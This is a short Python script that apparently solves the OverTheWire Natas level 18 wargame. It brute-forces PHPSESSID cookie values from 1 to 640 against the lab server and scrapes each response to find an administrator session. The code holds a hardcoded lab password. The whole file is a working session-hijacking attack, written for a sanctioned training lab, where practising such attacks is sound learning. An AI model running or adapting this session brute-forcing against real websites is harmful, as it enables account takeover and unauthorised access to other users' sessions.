#! /usr/bin/python

import requests
from bs4 import BeautifulSoup

url = 'http://natas18.natas.labs.overthewire.org'
auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

progress = int(0)

print('Scanning for admin session:')
print('|====================| 100%')
print('|', end='', flush=True)

for i in range(1, 641):
  res = requests.post(url, auth=auth, cookies={'PHPSESSID':f'{i}'})
  while res.status_code >= 500:
    res = requests.post(url, auth=auth, cookies={'PHPSESSID':f'{i}'})
    print('Server error, code {}'.format(res.status_code))
  if res.status_code != 200:
    print('ERROR, CODE {}'.format(res.status_code))
    exit()

  update = int(i/64)
  if update - progress > 0:
    for j in range(update-progress):
      print('==', end='', flush=True)
  progress = update

  content = BeautifulSoup(res.text, 'lxml').find(id='content').contents
  if content[0].split()[2] != 'logged':
    print('\n')
    for line in content:
      print(line)

print('| Done')
print('Scanning complete')

